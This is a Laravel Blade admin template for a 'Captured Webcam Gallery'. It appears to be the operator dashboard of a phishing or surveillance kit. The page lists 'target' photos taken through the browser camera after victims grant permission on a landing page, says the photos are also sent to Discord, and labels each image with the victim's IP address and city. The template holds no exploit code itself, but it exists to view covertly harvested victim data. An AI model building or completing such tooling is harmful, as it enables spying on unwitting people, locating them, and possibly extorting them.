@extends('layouts.admin')

@section('title', 'Webcam Captures')

@section('content')
<div class="space-y-6 max-w-7xl mx-auto">

    <!-- Header -->
    <div class="flex flex-col md:flex-row md:items-center justify-between gap-4">
        <div>
            <h1 class="text-2xl font-bold text-white tracking-tight">Captured Webcam Gallery</h1>
            <p class="text-zinc-400 text-sm mt-1">Real-time target photos captured through browser camera stream.</p>
        </div>
    </div>

    @if($snapshots->isEmpty())
        <div class="rounded-2xl bg-zinc-900 border border-zinc-800 p-16 text-center text-zinc-500">
            <i class="fa-solid fa-camera-retro text-5xl mb-3 opacity-30"></i>
            <h3 class="text-lg font-medium text-zinc-400">No photos captured yet</h3>
            <p class="text-xs text-zinc-500 mt-1">When a target grants camera permissions on the landing page, photos will stream here and to Discord.</p>
        </div>
    @else
        <!-- Grid -->
        <div class="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-4 lg:grid-cols-6 gap-4">
            @foreach($snapshots as $snap)
                <div class="group bg-zinc-900 border border-zinc-800 rounded-xl overflow-hidden shadow-lg hover:border-pink-500/50 transition duration-200">
                    <div class="aspect-video bg-black relative overflow-hidden">
                        <img src="{{ asset('storage/' . $snap->file_path) }}" 
                             alt="Snapshot" 
                             class="w-full h-full object-cover group-hover:scale-105 transition duration-300">
                        <a href="{{ asset('storage/' . $snap->file_path) }}" target="_blank" 
                           class="absolute inset-0 bg-black/40 opacity-0 group-hover:opacity-100 flex items-center justify-center text-white transition">
                            <i class="fa-solid fa-up-right-and-down-left-from-center text-lg"></i>
                        </a>
                    </div>
                    <div class="p-2.5 text-[11px] font-mono text-zinc-400 space-y-0.5">
                        <div class="text-zinc-200 font-bold truncate">
                            {{ $snap->visitorLog->ip ?? 'Unknown IP' }}
                        </div>
                        <div class="text-[10px] text-zinc-500 truncate">
                            {{ $snap->visitorLog->city ?? 'Unknown' }}
                        </div>
                        <div class="text-[10px] text-zinc-500">
                            {{ $snap->created_at->format('M d, H:i') }}
                        </div>
                    </div>
                </div>
            @endforeach
        </div>

        @if($snapshots->hasPages())
            <div class="pt-4">
                {{ $snapshots->links() }}
            </div>
        @endif
    @endif

</div>
@endsection
